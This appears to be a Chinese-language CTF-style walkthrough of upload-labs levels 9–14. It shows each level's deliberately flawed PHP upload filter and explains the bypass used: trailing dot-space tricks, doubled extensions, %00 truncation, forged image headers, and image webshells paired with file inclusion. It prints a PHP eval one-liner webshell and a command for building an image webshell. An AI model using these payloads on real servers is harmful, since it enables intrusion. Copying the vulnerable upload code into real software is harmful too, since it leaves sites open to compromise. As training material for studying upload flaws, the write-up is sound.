class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源代码中可以看出，这里过滤了所有后缀名和与Windows解析特性有关的字符，代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过。</p><p><img src="/2021/03/04/upload-labs-wp/17.jpg"></p><p>可以看到最后上传成功的文件名为<code>php.php点空格</code> 。</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>当没有重命名文件时，可以试着多种组合，绕过过滤。</p><hr><h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><h2 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由源码可以看出这里同样是过滤了所有的后缀名，与黑名单匹配不同，这里是用了str_ireplace函数，把后缀名在$deny_ext数组中的后缀名替换成空，所以这里我们可以用双写绕过。</p><p><img src="/2021/03/04/upload-labs-wp/18.jpg"></p><p>可以看到，文件名的php也替换成空了。</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>遇到将文件名后缀替换成空的题，可以用双写绕过。</p><hr><h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><h2 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题与前面的题不同，这里是设置了白名单，只有在白名单中的后缀名才可以上传，而且<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>文件上传后的路径是get传参可控的，所以这里可以采用0x00截断绕过。</p><p><img src="/2021/03/04/upload-labs-wp/19.jpg"></p><p>正常来说%00会把后面的截断，但这个成功的条件较为苛刻。</p><p><img src="/2021/03/04/upload-labs-wp/20.jpg"></p><p>可以看到在upload中%00把后面的内容截断了。</p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p><strong>0x00截断</strong>：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候，截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态，上传路径可控。</p><p>test.php(0x00).jpg</p><p>test.php%00.jpg</p><p>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p><p>为什么修改path才可以？</p><p>因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名。</p><p>那么，攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/20190818.php</p><p>移动文件的时候会将文件保存为：uploads/aaa.php</p><p>从而达到Getshell效果。</p><p><strong>问号截断（？）：</strong></p><p>问号截断漏洞是针对远程文件包含的情况。在PHP的配置文件中，打开远程文件包含许可，即“allow_url_include = On”。</p><p>当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。</p><hr><h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><h2 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该题与less-12一样，都是上传路径可控，只是这题是post传参控制路径，两者方法有不同，这里post传参的<code>%00</code>应该要通过修改hex的值来构造。</p><p><img src="/2021/03/04/upload-labs-wp/21.png"></p><p>将%00选中url编码，可以看到在回显中有上传成功。</p><hr><h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><p>%00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以能通过 burpsuite 修改 hex 值为 00 (URL decode)进行截断，或者将文件命名为123.php.jpg再在 burp suite 的proxy下 的hex中将 php后面的. 的2e改为 00。</p><hr><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><h2 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码上得到还是设置了图片后缀的白名单，但还设置了一检测文件内容的方法<code>getReailFileType</code>，来判断这是不是图片文件。这里如果上传木马，抓包改后缀肯定是不行的，还要修改 <strong>文件头的信息</strong>。</p><p><img src="/2021/03/04/upload-labs-wp/22.jpg"></p><p>可以看到上传成功。</p><p>这道题还有个文件包含漏洞。</p><p><img src="/2021/03/04/upload-labs-wp/23.jpg"></p><p>所以这里还可以利用这个漏洞，上传图片马。</p><p>首先制作图片马</p><p><img src="/2021/03/04/upload-labs-wp/24.jpg"></p><p>接着上传</p><p><img src="/2021/03/04/upload-labs-wp/25.jpg"></p><p>上传成功</p><p><img src="/2021/03/04/upload-labs-wp/26.jpg"></p><p>接着利用漏洞访问该图片</p><p><img src="/2021/03/04/upload-labs-wp/28.jpg"></p><p>访问成功，实测这里如果传的图片内容大的话，会访问失败，导致蚁剑连接失败，所以制作图片马的图片一定要简单小巧。</p><p><img src="/2021/03/04/upload-labs-wp/27.jpg"></p><hr><p>蚁剑连接成功。</p><h2 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2><p><em><strong><u>服务端的文件内容的检测</u></strong></em></p><p><strong>文件头校验</strong></p><p>文件头校验也叫文件幻数检测，主要是检测文件内容开始处的文件幻数，在文件首部加上如下幻数，后面跟一句话木马即可。</p><p>JPG文件：<strong>JFIF</strong> FF D8 FF E0 00 10 4A 46 49 46</p><p>GIF文件： <strong>GIF89a</strong> 47 49 46 38 39 61</p><p>PNG文件：<strong>PNG</strong> 89 50 4E 47</p><p>只需要用winhex打开一句话木马文件然后在16进制内容中将上面的图片头放在文件开始的位置就ok了</p><p>或者 找一个图片 在文件头后面插入一句话木马就行了</p><p>特殊情况是按照黑名单检测，比如检测php的头，&lt;?php</p><p>这时候我们可以用<script language="php">绕过（自PHP 7.0.0起，被移除）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&quot;pass&quot;</span>]);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>文件相关信息检测</strong></p>
<p>通常用的getimagesize()函数和exif_imagetype()函数，只需要在幻数基础上加一些文件信息就行了，如下：</p>
<p>GIF89a</p>
<p>(…some binary data for image…)</p> <?php phpinfo(); ?> <p>(… skipping the rest of binary data …)</p>
<p><em><strong><u>图片马</u></strong></em></p>
<p>一般直接上传木马文件都会被过滤拦截，这时候就需要用到图片马。</p>
<p>所谓图片马，就是将一句话木马与图片相结合，使得图片中包含代码。</p>
<p>制作方法：</p>
<p>一个正常图片，一个木马文件，内容为php一句话木马</p>
<p>在Windows终端中使用语句：<code>copy pic.jpg/b + php木马.php/a webshell.jpg</code>生成图片马</p>
<ul>
<li>/b 表示以二进制方式打开</li>
<li>/a 表示以ASCII方式打</li>
</ul>
<p>还可以用winhex或者notepad++直接打开图片在图片末尾加上一句话木马。</p>
<p><img src="upload-labs-wp/32.jpg"></p>
<p>可以看到这里用copy方式制作的图片马末尾有一句话木马语句。</p>
<p>但是图片马的使用条件苛刻，必须要搭配<strong>文件包含漏洞</strong>才可以使用。</p>
<hr>
<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><h2 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题使用了一个<code>getimagesize</code>函数来检测是否为图片文件，该函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 。</p>
